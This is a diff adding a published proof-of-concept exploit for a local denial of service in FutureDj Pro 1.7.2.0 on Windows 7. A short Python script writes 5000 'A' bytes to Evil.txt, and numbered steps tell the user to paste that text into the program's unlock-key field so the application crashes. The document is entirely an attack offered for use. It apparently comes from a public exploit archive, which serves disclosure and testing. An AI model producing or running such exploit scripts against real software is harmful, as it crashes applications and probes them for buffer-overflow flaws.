@@ -1,0 +1,32 @@
+﻿# Exploit Title: FutureDj Pro Local Dos Exploit
+# Date: 07.02.2019
+# Vendor Homepage: https://www.xylio.com
+# Software Link:   https://www.xylio.com/future-dj-pro-a-new-level-of-mixing-perfection/
+# Exploit Author: Achilles
+# Tested Version: 1.7.2.0 32bit
+# Tested on: Windows 7 SP1 Ultimate
+
+# 1.- Run python code : FutureDj Pro.py
+# 2.- Open EVIL.txt and copy content to clipboard
+# 3.- Open future.dj.exe
+# 4.- In the New Window click start Free Trial and then 'Click here to Buy'
+# 5.- And then 'i already bought it'
+# 6.- Paste the Content of EVIL.txt into the 'Unlock key' Name field.
+# 7.- Click 'OK'
+# 8.- Click 'OK'
+# 9.- Click 'Exit'
+# 10.- And you will see a crash
+
+
+#!/usr/bin/env python
+
+buffer = "\x41" * 5000
+
+try:
+	f=open("Evil.txt","w")
+	print "[+] Creating %s bytes evil payload.." %len(buffer)
+	f.write(buffer)
+	f.close()
+	print "[+] File created!"
+except:
+	print "File cannot be created"
